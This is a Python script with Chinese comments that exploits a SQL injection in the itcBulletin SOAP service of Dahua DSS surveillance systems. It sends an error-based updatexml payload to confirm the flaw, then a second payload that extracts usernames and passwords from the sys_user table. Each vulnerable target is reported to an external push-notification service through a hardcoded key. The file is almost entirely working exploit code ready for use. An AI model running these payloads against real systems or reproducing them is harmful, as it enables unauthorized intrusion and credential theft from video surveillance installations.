# Dahua_DSS_system_itcBulletin_SQL_injection_scan.py
#大华 DSS 数字监控系统 itcBulletin SQL 注入漏洞
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re

def sc_send(text, desp='', key='[SENDKEY]'):
    postdata = urllib.parse.urlencode({'text': text, 'desp': desp}).encode('utf-8')
    urlserver = f'https://sctapi.ftqq.com/{key}.send'
    req = urllib.request.Request(urlserver, data=postdata, method='POST')
    with urllib.request.urlopen(req) as response:
        result = response.read().decode('utf-8')
    return result
key = "SCT202695TeKe1ATgRMke7f7jyrOOkH9GX"

def scan_Dahua_DSS_system_itcBulletin_SQL_injection(url, proxies, headers, append_to_output):

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    if url.endswith("/"):
        path = "portal/services/itcBulletin?wsdl"
    else:
        path = "/portal/services/itcBulletin?wsdl"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        'Accept-Encoding': 'gzip',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'text/xml;charset=UTF-8',
    }

    encodetext = url + path
    xml_payload = '''<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
      <s11:Body>
        <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
          <netMarkings>
            (updatexml(1,concat(0x7e,user(),0x7e),1))) and (1=1
          </netMarkings>
        </ns1:deleteBulletin>
      </s11:Body>
    </s11:Envelope>'''
    append_to_output("===================================================================", "green")
    append_to_output(f"扫描目标: {url}", "yellow")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.post(encodetext, data=xml_payload, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 500 and 'XPATH' in req1.text:
            append_to_output(f"[+] {url} 存在大华DSS数字监控系统 itcBulletin SQL注入漏洞！！！！", "red")
            ret = sc_send('大华DSS数字监控系统 itcBulletin SQL注入漏洞', f"漏洞连接: {url}\r\n漏洞类型: 命令执行", key)
            xml_payload1 = '''<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
              <s11:Body>
                <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
                  <netMarkings>
                    (updatexml(1,concat(0x7e,(select substr(group_concat(login_name, " ",login_pass),1,30) from sys_user),0x7e),1))) and (1=1
                  </netMarkings>
                </ns1:deleteBulletin>
              </s11:Body>
            </s11:Envelope>'''
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            req2 = requests.post(encodetext, data=xml_payload1, headers=headers, verify=False, timeout=20,proxies=proxies)
            if req2.status_code == 500 and 'XPATH' in req2.text:
                pattern = r'~(.*?)~'  # 使用正则表达式模式匹配 ~ 之间的内容

                matches = re.findall(pattern, req2.text)

                if matches:
                    first_match = matches[0]
                    append_to_output(f"发现账号密码为 ： {first_match}","yellow")  # 输出第一个匹配项
                else:
                    append_to_output("No matches found.")
        else:
            append_to_output(f"[-] {url} 不存在大华 DSS 数字监控系统 itcBulletin SQL 注入漏洞", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
